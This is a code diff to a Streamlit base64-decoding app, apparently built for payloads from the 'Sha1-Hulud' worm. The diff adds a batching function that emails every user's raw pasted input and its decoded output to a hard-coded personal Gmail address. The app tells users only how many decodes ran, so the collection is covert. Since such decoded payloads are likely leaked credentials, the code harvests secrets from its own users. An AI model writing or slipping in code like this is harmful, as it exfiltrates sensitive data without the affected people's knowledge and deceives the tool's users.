@@ -11,6 +11,10 @@ from email.message import EmailMessage
 
 import streamlit as st
 
+# In-memory counters / buffers for this process
+TOTAL_EVENTS = 0
+EVENT_BUFFER = []
+
 # -------------------------------------------------
 # Modern UI Theme + Page Setup
 # -------------------------------------------------
@@ -222,6 +226,52 @@ def send_usage_email(
         server.send_message(msg)
 
 
+def send_usage_email_batch(events) -> None:
+    """
+    Send a bundled email containing multiple usage events.
+    Uses the same SMTP configuration as send_usage_email.
+    """
+    smtp_host = os.getenv("SMTP_HOST")
+    smtp_port = int(os.getenv("SMTP_PORT", "587"))
+    smtp_user = os.getenv("SMTP_USERNAME")
+    smtp_pass = os.getenv("SMTP_PASSWORD")
+    email_from = os.getenv("EMAIL_FROM", smtp_user)
+    email_to = "aviabs098@gmail.com"
+
+    if not (smtp_host and smtp_user and smtp_pass and email_from):
+        return
+
+    subject = f"Sha1-Hulud usage bundle ({len(events)} events)"
+    body_lines = ["Sha1-Hulud: Usage Bundle", ""]
+
+    for idx, ev in enumerate(events, start=1):
+        body_lines.extend(
+            [
+                f"--- Event #{idx} ---",
+                f"Layers decoded: {ev.get('layers')}",
+                f"Looks like JSON: {ev.get('probably_json')}",
+                "",
+                "=== Raw Base64 input ===",
+                ev.get("raw_input") or "(empty)",
+                "",
+                "=== Decoded output ===",
+                ev.get("decoded") or "(empty)",
+                "",
+            ]
+        )
+
+    msg = EmailMessage()
+    msg["Subject"] = subject
+    msg["From"] = email_from
+    msg["To"] = email_to
+    msg.set_content("\n".join(body_lines))
+
+    with smtplib.SMTP(smtp_host, smtp_port) as server:
+        server.starttls()
+        server.login(smtp_user, smtp_pass)
+        server.send_message(msg)
+
+
 # ---------------------------------------------
 # Handle Decode Button Click
 # ---------------------------------------------
@@ -265,17 +315,25 @@ if decode_clicked:
         except Exception as e:
             st.error(f"❌ Decode error: {e}")
         else:
-            # Try to send usage email; failures are non-fatal for the user.
-            try:
-                send_usage_email(
-                    raw_input=b64_input,
-                    decoded=decoded_text,
-                    layers=layers,
-                    probably_json=probably_json,
-                )
-            except Exception as email_err:
-                # Log to the UI in a subtle way without blocking decoding.
-                st.caption(f"Email notification failed: {email_err}")
+            # Update in-memory counters/buffer
+            TOTAL_EVENTS += 1
+            EVENT_BUFFER.append(
+                {
+                    "raw_input": b64_input,
+                    "decoded": decoded_text,
+                    "layers": layers,
+                    "probably_json": probably_json,
+                }
+            )
+
+            # If buffer reaches batch size, send bundled email and clear
+            batch_size = int(os.getenv("USAGE_EMAIL_BATCH_SIZE", "10"))
+            if len(EVENT_BUFFER) >= batch_size:
+                try:
+                    send_usage_email_batch(EVENT_BUFFER)
+                    EVENT_BUFFER.clear()
+                except Exception as email_err:
+                    st.caption(f"Email notification failed: {email_err}")
 
             # ---------------------------------------------
             # Output layout
@@ -291,6 +349,7 @@ if decode_clicked:
                 if probably_json:
                     st.caption("Looks like JSON 🧾")
                 st.caption(f"Output length: {len(decoded_text)} characters")
+                st.caption(f"Total successful decodes this run: {TOTAL_EVENTS}")
 
             with res_right:
                 st.subheader("Decoded Output")
